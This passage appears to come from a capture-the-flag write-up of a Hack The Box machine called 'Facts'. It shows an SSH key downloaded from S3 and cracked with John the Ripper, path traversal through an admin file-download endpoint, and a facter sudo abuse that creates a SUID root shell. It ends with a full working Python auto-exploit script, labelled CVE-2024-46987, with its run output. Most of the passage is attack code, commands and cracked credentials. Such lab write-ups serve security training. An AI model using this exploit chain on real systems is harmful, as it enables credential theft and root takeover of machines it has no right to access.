download: s3://internal/.cache/motd.legal-displayed to s3_download/.cache/motd.legal-displayed
download: s3://internal/.lesshst to s3_download/.lesshst          
download: s3://internal/.ssh/authorized_keys to s3_download/.ssh/authorized_keys
download: s3://internal/.profile to s3_download/.profile          
download: s3://internal/.ssh/id_ed25519 to s3_download/.ssh/id_ed25519
download: s3://internal/.bundle/cache/compact_index/rubygems.org.443.29b0360b937aa4d161703e6160654e47/versions to s3_download/.bundle/cache/compact_index/rubygems.org.443.29b0360b937aa4d161703e6160654e47/versions
```

The downloaded content revealed a complete user home directory including bash configuration files and crucially an `.ssh` directory.

```shell
┌──(kali㉿kali)-[/media/…/Machines/Facts/files/s3_download]
└─$ ls -la
total 16
drwxrwx--- 1 root vboxsf  104 Feb  3 14:04 .
drwxrwx--- 1 root vboxsf   98 Feb  3 14:05 ..
-rwxrwx--- 1 root vboxsf  220 Jan  8 19:45 .bash_logout
-rwxrwx--- 1 root vboxsf 3900 Jan  8 19:45 .bashrc
drwxrwx--- 1 root vboxsf   10 Feb  3 14:04 .bundle
drwxrwx--- 1 root vboxsf   40 Feb  3 14:04 .cache
-rwxrwx--- 1 root vboxsf   20 Jan  8 19:47 .lesshst
-rwxrwx--- 1 root vboxsf  807 Jan  8 19:47 .profile
drwxrwx--- 1 root vboxsf   50 Feb  3 14:04 .ssh
```

The `.ssh` directory contained an `SSH` private key. We attempted to remove the passphrase protection to verify the key format.

```shell
┌──(kali㉿kali)-[/media/…/Facts/files/s3_download/.ssh]
└─$ ssh-keygen -p -f id_ed25519
Enter old passphrase: 
Key has comment 'trivia@facts.htb'
Enter new passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved with the new passphrase.
```

We extracted the public key to confirm the key belonged to the `trivia` user.

```shell
┌──(kali㉿kali)-[/media/…/Facts/files/s3_download/.ssh]
└─$ ssh-keygen -y -f id_ed25519
Enter passphrase for "id_ed25519": 
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGKWt1+3Mn//MbHM7H2AIk9Z6jeoeDPlCFktxH2fprRw trivia@facts.htb
```

| Username |
| -------- |
| trivia   |

When attempting to use the key for `SSH` authentication we were prompted for a passphrase indicating the key was password protected.

```shell
┌──(kali㉿kali)-[/media/…/Facts/files/s3_download/.ssh]
└─$ ssh -i trivia_id_ed25519 trivia@10.129.104.0
The authenticity of host '10.129.104.0 (10.129.104.0)' can't be established.
ED25519 key fingerprint is: SHA256:fygAnw6lqDbeHg2Y7cs39viVqxkQ6XKE0gkBD95fEzA
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.104.0' (ED25519) to the list of known hosts.
Enter passphrase for key 'trivia_id_ed25519':
```

### Cracking the Hash using John the Ripper

We used `ssh2john` to extract the hash from the encrypted private key and attempted to crack it using `John the Ripper`.

```shell
┌──(kali㉿kali)-[/media/…/Facts/files/s3_download/.ssh]
└─$ ssh2john trivia_id_ed25519 > trivia.hash
```

```shell
┌──(kali㉿kali)-[/media/…/Facts/files/s3_download/.ssh]
└─$ sudo john trivia.hash --wordlist=/usr/share/wordlists/rockyou.txt
[sudo] password for kali: 
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 24 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
dragonballz      (trivia_id_ed25519)     
1g 0:00:04:10 DONE (2026-01-31 20:36) 0.003990g/s 12.77p/s 12.77c/s 12.77C/s grecia..imissu
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

| Password    |
| ----------- |
| dragonballz |

With the cracked passphrase we successfully authenticated via `SSH` as the `trivia` user.

```shell
┌──(kali㉿kali)-[/media/…/Facts/files/s3_download/.ssh]
└─$ ssh -i trivia_id_ed25519 trivia@10.129.104.0                   
Enter passphrase for key 'trivia_id_ed25519': 
Last login: Wed Jan 28 16:17:19 UTC 2026 from 10.10.14.4 on ssh
Welcome to Ubuntu 25.04 (GNU/Linux 6.14.0-37-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sat Jan 31 07:36:55 PM UTC 2026

  System load:           0.09
  Usage of /:            75.0% of 7.28GB
  Memory usage:          20%
  Swap usage:            0%
  Processes:             221
  Users logged in:       1
  IPv4 address for eth0: 10.129.104.0
  IPv6 address for eth0: dead:beef::250:56ff:fe94:d23e


0 updates can be applied immediately.

trivia@facts:~$
```

## user.txt (unintended)

Using the path traversal vulnerability we extracted the `user.txt` flag from the `william` user's home directory.

```shell
GET /admin/media/download_private_file?file=../../../../../../home/william/user.txt HTTP/1.1
Host: facts.htb
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://facts.htb/admin/login
Accept-Encoding: gzip, deflate, br
Cookie: auth_token=oZ9tdGqmMjS3Byp4xnwtTQ&Mozilla%2F5.0+%28X11%3B+Linux+x86_64%29+AppleWebKit%2F537.36+%28KHTML%2C+like+Gecko%29+Chrome%2F143.0.0.0+Safari%2F537.36&10.10.16.21; _factsapp_session=sGnNHSjsOjBTYq4twv0Xs9HBSY3eozW%2Fdqeogq9b5o38zEN8bYcKprc%2FR1s8nTREulFwZaQJEKeCSvu%2BchhG0CffR3Pe%2FIfsRhEf8WDrcEOYEsjwz2oYEyV13Ibxr%2BYBf0mlls41pelLS4KdNaA%2FQDPiQJ4%2FPzXmAK11R3h90VCXBBYEZlj4vG%2F004mf4vKgBt%2Fnh5EfZeWBZYFf666%2FPPvxqz7bG2on2Bl4b2soDqnWbknu5RP0lHYICPIel5lJrz9EzNsMIEWh8iR%2B0p5wFfT0oYfvvxyvPO%2FYa0ZISIbJVMZXQVyaSODzMbL4BvVd75ba7J1TEqYceCcg7%2FW%2BPuL65k5IozD0R%2FhTHZ%2BbfY2BmZUCoPhuAkc%3D--eSy0MDUlVPwUKrcs--3yBniLf1Ro8cTphuLIls0A%3D%3D
If-None-Match: W/"01192c51c0a218c3e9fd29ccf0450108"
Connection: keep-alive


```

```shell
HTTP/1.1 200 OK
Server: nginx/1.26.3 (Ubuntu)
Date: Sat, 31 Jan 2026 19:44:35 GMT
Content-Type: text/plain
Content-Length: 33
Connection: keep-alive
x-frame-options: SAMEORIGIN
x-xss-protection: 0
x-content-type-options: nosniff
x-permitted-cross-domain-policies: none
referrer-policy: strict-origin-when-cross-origin
content-disposition: inline; filename="user.txt"; filename*=UTF-8''user.txt
content-transfer-encoding: binary
cache-control: no-cache
x-request-id: 615cb3d3-b926-4e9e-b436-a87c1338500f
x-runtime: 0.045988

d1f6d655bed614cb6c18a15f3f390d9c

```

![](images/2026-01-31_20-58_80_burp_suite_usertxt.png)

| Flag                             |
| -------------------------------- |
| d1f6d655bed614cb6c18a15f3f390d9c |

## Enumeration (trivia)

As first logical step we checked our privileges and group memberships.

```shell
trivia@facts:~$ id
uid=1000(trivia) gid=1000(trivia) groups=1000(trivia)
```

Checking `sudo` privileges revealed we could execute `/usr/bin/facter` as `root` without a password.

```shell
trivia@facts:~$ sudo -l
Matching Defaults entries for trivia on facts:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User trivia may run the following commands on facts:
    (ALL) NOPASSWD: /usr/bin/facter
```

## Privilege Escalation to root

### facter sudo Abuse

The `facter` utility is a tool that gathers system information and can be abused when run with `sudo` privileges by loading custom fact scripts.

- [https://gtfobins.org/gtfobins/facter/#inherit](https://gtfobins.org/gtfobins/facter/#inherit)

We created a malicious `Ruby` script in `/tmp` that would set the `SUID` bit on `/bin/bash`.

```shell
trivia@facts:/tmp$ cat x.rb 
system("chmod 4777 /usr/bin/bash")
```

Next we executed `facter` with `sudo` privileges using the `--custom-dir` parameter to load our malicious script.

```shell
trivia@facts:/tmp$ sudo /usr/bin/facter --custom-dir=/tmp/ 
disks => {
  sda => {
    model => "Virtual disk",
    serial => "6000c29cf994f5b68cb14771459e4190",
    size => "10.00 GiB",
    size_bytes => 10737418240,
    type => "ssd",
    vendor => "VMware",
    wwn => "0x6000c29cf994f5b68cb14771459e4190"
  }
}
<--- CUT FOR BREVITY --->
system_uptime => {
  days => 0,
  hours => 0,
  seconds => 491,
  uptime => "0:08 hours"
}
timezone => UTC
virtual => vmware
```

Our malicious `Ruby` script was executed as `root` during the fact gathering process setting the `SUID` bit on `/bin/bash`. We then used the `-p` flag to spawn a privileged shell.

```shell
trivia@facts:/tmp$ /bin/bash -p
bash-5.2#
```

## root.txt

```shell
bash-5.2# cat root.txt 
ee254ca3d6de8b5a035e4af46eda941a
```

## Post Exploitation

### Semi-Auto Exploitation Script

The script is "kind of automated" because we have to read the `CAPTCHA` and due to the necessary steps in `Privilege Escalation` to `root`, one command needs to be inserted manually.

```shell
┌──(kali㉿kali)-[/media/…/HTB/Machines/Facts/files]
└─$ cat exploit.py 
#!/usr/bin/env python3

import requests
import re
import sys
import argparse
import random
import string
from urllib.parse import urljoin
import subprocess
import os
from colorama import Fore, Style, init
import tempfile

init(autoreset=True)

class FactsExploit:
    def __init__(self, target, target_ip, password=None, output_dir=None):
        self.target = target.rstrip('/')
        self.target_ip = target_ip
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36'
        })
        self.username = self._generate_random_string(8)
        self.password = password or self._generate_random_string(12)
        self.output_dir = output_dir or os.getcwd()
        os.makedirs(self.output_dir, exist_ok=True)
        
    def _generate_random_string(self, length):
        return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))
    
    def _print_status(self, message, status="info"):
        colors = {
            "info": Fore.CYAN,
            "success": Fore.GREEN,
            "error": Fore.RED,
            "warning": Fore.YELLOW,
        }
        color = colors.get(status, Fore.WHITE)
        print(f"{color}[{status.upper()}]{Style.RESET_ALL} {message}")
    
    def _save_to_file(self, filename, content, mode='w'):
        filepath = os.path.join(self.output_dir, filename)
        if isinstance(content, bytes):
            mode = 'wb'
        try:
            with open(filepath, mode) as f:
                f.write(content)
            return filepath
        except Exception as e:
            self._print_status(f"Failed to save file: {e}", "error")
            return None
    
    def _add_to_hosts(self, ip, hostname):
        try:
            with open('/etc/hosts', 'r') as f:
                if hostname in f.read():
                    return True
            
            self._print_status(f"Adding {ip} {hostname} to /etc/hosts", "info")
            result = subprocess.run(
                ['sudo', 'bash', '-c', f'echo "{ip}\t{hostname}" >> /etc/hosts'],
                capture_output=True, text=True
            )
            if result.returncode == 0:
                self._print_status("Added to /etc/hosts", "success")
                return True
            return False
        except:
            return False
    
    def _download_captcha_image(self, captcha_url):
        try:
            response = self.session.get(captcha_url, timeout=10)
            if response.status_code == 200:
                return self._save_to_file("captcha.png", response.content, mode='wb')
        except:
            pass
        return None
    
    def create_account(self, captcha_answer=None):
        self._print_status(f"Creating account: {self.username}", "info")
        
        register_url = urljoin(self.target, "/admin/register")
        
        try:
            response = self.session.get(register_url, timeout=10)
            response.raise_for_status()
        except:
            return False
        
        csrf_match = re.search(r'name="authenticity_token" value="([^"]+)"', response.text)
        if not csrf_match:
            return False
        
        csrf_token = csrf_match.group(1)
        
        captcha_match = re.search(r'src=[\'"]([^"\']*captcha[^"\']*)[\'"]', response.text)
        if captcha_match:
            captcha_url = urljoin(self.target, captcha_match.group(1).split('&t=')[0])
            captcha_path = self._download_captcha_image(captcha_url)
            
            if not captcha_answer:
                print(f"\n{Fore.YELLOW}{'='*60}")
                print(f"CAPTCHA REQUIRED")
                print(f"{'='*60}{Style.RESET_ALL}")
                if captcha_path:
                    print(f"{Fore.GREEN}Captcha saved to:{Style.RESET_ALL} {captcha_path}")
                    try:
                        subprocess.Popen(['ristretto', captcha_path], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                        self._print_status("Opening captcha with ristretto", "info")
                    except:
                        pass
                
                captcha_answer = input(f"{Fore.CYAN}Enter CAPTCHA:{Style.RESET_ALL} ").strip()
                print(f"{Fore.YELLOW}{'='*60}{Style.RESET_ALL}\n")
        
        if not captcha_answer:
            return False
        
        register_data = {
            "authenticity_token": csrf_token,
            "user[first_name]": self.username,
            "user[last_name]": self.username,
            "user[email]": f"{self.username}@{self.username}.local",
            "user[username]": self.username,
            "user[password]": self.password,
            "user[password_confirmation]": self.password,
            "captcha": captcha_answer
        }
        
        try:
            response = self.session.post(
                register_url, 
                data=register_data,
                headers={
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Origin': self.target,
                    'Referer': register_url,
                },
                allow_redirects=True,
                timeout=10
            )
            
            if "login" in response.url.lower():
                self._print_status(f"Account created, logging in...", "success")
                return self.login()
            elif "dashboard" in response.url.lower():
                self._print_status(f"Logged in!", "success")
                return True
            else:
                return self.login()
        except:
            return False
    
    def login(self):
        self._print_status(f"Logging in as {self.username}", "info")
        login_url = urljoin(self.target, "/admin/login")
        
        try:
            response = self.session.get(login_url, timeout=10)
        except:
            return False
        
        csrf_match = re.search(r'name="authenticity_token" value="([^"]+)"', response.text)
        if not csrf_match:
            return False
        
        login_data = {
            "authenticity_token": csrf_match.group(1),
            "user[username]": self.username,
            "user[password]": self.password
        }
        
        try:
            response = self.session.post(
                login_url,
                data=login_data,
                headers={
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Origin': self.target,
                    'Referer': login_url,
                },
                allow_redirects=True,
                timeout=10
            )
            
            if "dashboard" in response.url.lower() or ("admin" in response.url and "login" not in response.url.lower()):
                self._print_status("Login successful!", "success")
                return True
        except:
            pass
        return False
    
    def exploit_path_traversal(self, file_path):
        exploit_url = urljoin(self.target, "/admin/media/download_private_file")
        params = {"file": f"../../../../../../{file_path.lstrip('/')}"}
        
        try:
            response = self.session.get(exploit_url, params=params, timeout=10)
            if response.status_code == 200 and not response.text.startswith('<!DOCTYPE'):
                return response.content
        except:
            pass
        return None
    
    def get_user_flag(self):
        self._print_status(f"Retrieving user flag", "info")
        flag = self.exploit_path_traversal("/home/william/user.txt")
        
        if flag:
            flag_str = flag.decode('utf-8', errors='ignore').strip() if isinstance(flag, bytes) else flag.strip()
            print(f"{Fore.GREEN}[USER FLAG]{Style.RESET_ALL} {flag_str}")
            self._save_to_file("user.txt", flag_str)
            return flag_str
        return None
    
    def exploit_to_root(self, auto_escalate=False):
        self._print_status("Extracting SSH key for trivia", "info")
        
        ssh_key = self.exploit_path_traversal("/home/trivia/.ssh/id_ed25519")
        if not ssh_key:
            self._print_status("Failed to get SSH key", "error")
            return False
        
        ssh_key_str = ssh_key.decode('utf-8', errors='ignore') if isinstance(ssh_key, bytes) else ssh_key
        if "BEGIN OPENSSH PRIVATE KEY" not in ssh_key_str:
            self._print_status("Invalid SSH key", "error")
            return False
        
        self._print_status("SSH key retrieved!", "success")
        
        key_path = self._save_to_file("trivia_id_ed25519", ssh_key)
        os.chmod(key_path, 0o600)
        
        if auto_escalate:
            return self._auto_privilege_escalation(key_path)
        else:
            return self._spawn_interactive_shell(key_path)
    
    def _auto_privilege_escalation(self, key_path):
        self._print_status("Executing automatic privilege escalation", "info")
        
        try:
            subprocess.run(['expect', '-v'], capture_output=True, check=True)
        except (FileNotFoundError, subprocess.CalledProcessError):
            self._print_status("expect not found. Install with: sudo apt install expect", "error")
            return self._spawn_interactive_shell(key_path)
        
        expect_script = f'''#!/usr/bin/expect -f
set timeout 20
spawn ssh -i {key_path} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null trivia@{self.target_ip}
expect "passphrase"
send "dragonballz\\r"
expect "trivia@"
send "cat > /tmp/x.rb << 'EOF'\\r"
send "system(\\"cp /usr/bin/bash /bin/rootbash\\")\\r"
send "system(\\"chmod 4777 /bin/rootbash\\")\\r"
send "EOF\\r"
expect "trivia@"
send "sudo /usr/bin/facter --custom-dir=/tmp/\\r"
sleep 3
expect "trivia@"
send "/bin/rootbash -p -c 'cat /root/root.txt' 2>&1\\r"
expect -re "trivia@"
send "exit\\r"
expect eof
'''
        
        with tempfile.NamedTemporaryFile(mode='w', delete=False, suffix='.exp') as f:
            f.write(expect_script)
            expect_path = f.name
        
        os.chmod(expect_path, 0o755)
        
        try:
            self._print_status("Creating SUID bash at /bin/rootbash...", "info")
            result = subprocess.run(
                ['expect', expect_path],
                capture_output=True,
                text=True,
                timeout=30
            )
            
            self._save_to_file("privesc_output.txt", result.stdout)
            
            all_hashes = re.findall(r'\b([a-f0-9]{32})\b', result.stdout)
            root_flag = all_hashes[-1] if all_hashes else None
            
            if root_flag:
                print(f"\n{Fore.GREEN}{'='*60}")
                print(f"ROOT ACCESS ACHIEVED!")
                print(f"{'='*60}{Style.RESET_ALL}")
                print(f"{Fore.GREEN}[ROOT FLAG]{Style.RESET_ALL} {root_flag}\n")
                self._save_to_file("root.txt", root_flag)
                
                print(f"{Fore.YELLOW}Privilege escalation successful!{Style.RESET_ALL}")
                print(f"{Fore.YELLOW}SUID bash created at /bin/rootbash{Style.RESET_ALL}\n")
                print(f"{Fore.GREEN}To get root shell:{Style.RESET_ALL}")
                print(f"  /bin/rootbash -p")
                print(f"{Fore.GREEN}{'='*60}{Style.RESET_ALL}\n")
                
            else:
                self._print_status("Could not extract root flag, but rootbash may be created", "warning")
                print(f"\n{Fore.YELLOW}Try manually:{Style.RESET_ALL}")
                print(f"  ssh -i {key_path} trivia@{self.target_ip}")
                print(f"  /bin/rootbash -p")
                print(f"  cat /root/root.txt\n")
                
        except subprocess.TimeoutExpired:
            self._print_status("Timeout during privilege escalation", "warning")
            print(f"\n{Fore.YELLOW}SUID bash may have been created. Try:{Style.RESET_ALL}")
            print(f"  ssh -i {key_path} trivia@{self.target_ip}")
            print(f"  /bin/rootbash -p\n")
        except Exception as e:
            self._print_status(f"Error during auto escalation: {e}", "error")
        finally:
            try:
                os.unlink(expect_path)
            except:
                pass
        
        print(f"\n{Fore.CYAN}Would you like an interactive shell as trivia? (y/n):{Style.RESET_ALL} ", end='')
        choice = input().strip().lower()
        if choice == 'y':
            return self._spawn_interactive_shell(key_path)
        
        return True
    
    def _spawn_interactive_shell(self, key_path):
        print(f"\n{Fore.CYAN}{'='*60}")
        print(f"{Fore.GREEN}SSH ACCESS READY{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
        print(f"{Fore.GREEN}Key:{Style.RESET_ALL} {key_path}")
        print(f"{Fore.GREEN}Passphrase:{Style.RESET_ALL} dragonballz")
        print(f"{Fore.GREEN}User:{Style.RESET_ALL} trivia@{self.target_ip}")
        print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}\n")
        
        print(f"{Fore.YELLOW}Escalate to root:{Style.RESET_ALL}")
        print(f"  /bin/rootbash -p")
        print(f"\n{Fore.CYAN}{'='*60}{Style.RESET_ALL}\n")
        
        self._print_status("Spawning SSH session...", "info")
        
        try:
            subprocess.run(['expect', '-v'], capture_output=True, check=True)
            
            expect_script = f'''#!/usr/bin/expect -f
set timeout -1
spawn ssh -i {key_path} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null trivia@{self.target_ip}
expect {{
    "passphrase" {{
        send "dragonballz\\r"
        exp_continue
    }}
    "trivia@" {{
        interact
    }}
}}
'''
            
            with tempfile.NamedTemporaryFile(mode='w', delete=False, suffix='.exp') as f:
                f.write(expect_script)
                expect_path = f.name
            
            os.chmod(expect_path, 0o755)
            os.execvp('expect', ['expect', expect_path])
            
        except (FileNotFoundError, subprocess.CalledProcessError):
            self._print_status("expect not found, using standard SSH", "warning")
            print(f"\n{Fore.YELLOW}You will be prompted for the passphrase:{Style.RESET_ALL} dragonballz\n")
            
            ssh_cmd = [
                'ssh',
                '-i', key_path,
                '-o', 'StrictHostKeyChecking=no',
                '-o', 'UserKnownHostsFile=/dev/null',
                f'trivia@{self.target_ip}'
            ]
            os.execvp('ssh', ssh_cmd)
        
        return True

def main():
    parser = argparse.ArgumentParser(description='Facts HTB Auto-Exploit - CVE-2024-46987')
    
    parser.add_argument('-t', '--target', required=True, help='Target URL (e.g., http://facts.htb)')
    parser.add_argument('-c', '--captcha', help='Captcha answer')
    parser.add_argument('-o', '--output', help='Output directory')
    parser.add_argument('--auto', action='store_true', help='Automatically escalate to root and get flag')
    parser.add_argument('--shell', action='store_true', help='Spawn interactive shell (default)')
    
    args = parser.parse_args()
    
    print(f"""
{Fore.CYAN}{'='*60}
{Fore.GREEN}Facts HTB Auto-Exploit
{Fore.CYAN}CVE-2024-46987 → Root Shell
{Fore.CYAN}{'='*60}{Style.RESET_ALL}
""")
    
    target_ip = input(f"{Fore.CYAN}Target IP:{Style.RESET_ALL} ").strip()
    
    print()
    
    exploit = FactsExploit(args.target, target_ip, output_dir=args.output)
    
    exploit._add_to_hosts(target_ip, "facts.htb")
    
    if not exploit.create_account(captcha_answer=args.captcha):
        sys.exit(1)
    
    exploit.get_user_flag()
    
    auto_mode = args.auto or (not args.shell and not args.auto)
    if auto_mode and not args.shell:
        print(f"{Fore.CYAN}Mode:{Style.RESET_ALL} Automatic privilege escalation")
        exploit.exploit_to_root(auto_escalate=True)
    else:
        print(f"{Fore.CYAN}Mode:{Style.RESET_ALL} Interactive shell")
        exploit.exploit_to_root(auto_escalate=False)

if __name__ == "__main__":
    main()
```

```shell
┌──(venv)─(kali㉿kali)-[/media/…/HTB/Machines/Facts/files]
└─$ python3 exploit.py -t http://facts.htb

============================================================
Facts HTB Auto-Exploit
CVE-2024-46987 → Root Shell
============================================================

Target IP: 10.129.105.24

[INFO] Creating account: bvlh5o7s

============================================================
CAPTCHA REQUIRED
============================================================
Captcha saved to: /media/sf_cybersecurity/notes/HTB/Machines/Facts/Files/captcha.png
[INFO] Opening captcha with ristretto
Enter CAPTCHA: AC4VU
============================================================

[SUCCESS] Account created, logging in...
[INFO] Logging in as bvlh5o7s
[SUCCESS] Login successful!
[INFO] Retrieving user flag
[USER FLAG] 6c127c02a6f4a62c0c31ccff2b81d648
Mode: Automatic privilege escalation
[INFO] Extracting SSH key for trivia
[SUCCESS] SSH key retrieved!
[INFO] Executing automatic privilege escalation
[INFO] Creating SUID bash at /bin/rootbash...

============================================================
ROOT ACCESS ACHIEVED!
============================================================
[ROOT FLAG] 440690bb3a33b6dab2d95edf3a61cb68

Privilege escalation successful!
SUID bash created at /bin/rootbash

To get root shell:
  /bin/rootbash -p
============================================================


Would you like an interactive shell as trivia? (y/n): y

============================================================
SSH ACCESS READY
============================================================
Key: /media/sf_cybersecurity/notes/HTB/Machines/Facts/Files/trivia_id_ed25519
Passphrase: dragonballz
User: trivia@10.129.105.24
============================================================

Escalate to root:
  /bin/rootbash -p

============================================================

[INFO] Spawning SSH session...
spawn ssh -i /media/sf_cybersecurity/notes/HTB/Machines/Facts/Files/trivia_id_ed25519 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null trivia@10.129.105.24
Warning: Permanently added '10.129.105.24' (ED25519) to the list of known hosts.
Enter passphrase for key '/media/sf_cybersecurity/notes/HTB/Machines/Facts/Files/trivia_id_ed25519': 
Last login: Sun Feb  1 16:42:16 UTC 2026 from 10.10.16.21 on ssh
Welcome to Ubuntu 25.04 (GNU/Linux 6.14.0-37-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sun Feb  1 04:42:16 PM UTC 2026

  System load:           0.0
  Usage of /:            72.1% of 7.28GB
  Memory usage:          18%
  Swap usage:            0%
  Processes:             222
  Users logged in:       1
  IPv4 address for eth0: 10.129.105.24
  IPv6 address for eth0: dead:beef::250:56ff:fe94:21e


0 updates can be applied immediately.

Failed to connect to https://changelogs.ubuntu.com/meta-release. Check your Internet connection or proxy settings

trivia@facts:~$ /bin/rootbash -p
rootbash-5.2#
```